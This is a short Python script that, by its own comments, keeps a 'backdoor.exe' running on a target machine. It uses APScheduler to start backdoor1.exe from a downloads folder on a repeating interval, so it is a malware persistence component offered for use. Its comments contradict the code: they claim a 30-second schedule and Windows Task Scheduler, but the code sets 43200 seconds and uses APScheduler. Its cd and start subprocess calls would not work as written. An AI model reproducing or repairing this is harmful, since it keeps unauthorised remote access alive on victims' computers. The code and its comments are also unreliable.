# Import APIScheduler to schedule running backdoor.exe file on target machine (BackgroundScheduler)
from apscheduler.schedulers.background import BackgroundScheduler as Scheduler
# Import subprocess as to open cmd and run commands
import subprocess
# Import time to sleep
import time


# Run this method every thirty (30) seconds using Windows Task Scheduler
def schedule_task():
    # Store the path to the backdoor.exe file in path_to_exe file
    directory_of_exe = "D:\\DDownloads"
    # Store the command that needs to be run, to start the exe file
    command_cd = ["cd", directory_of_exe]
    command_run = ["start", "backdoor1.exe"]
    # Running both commands using subprocess Module
    subprocess.run(command_cd)
    subprocess.run(command_run)


def main(is_run):
    if is_run:
        # Create an Instance of Scheduler Class
        scheduler = Scheduler()
        # Store Interval in Seconds, run every day twice
        interval_secs = 43200
        # Add the schedule_task method to the scheduler
        scheduler.add_job(schedule_task, 'interval', seconds=interval_secs)
        # Start the Scheduler
        scheduler.start()

        # Try and catch (except)
        try:
            while True:
                time.sleep(2)
        except (KeyboardInterrupt, SystemExit):
            scheduler.shutdown()


if __name__ == '__main__':
    main(True)
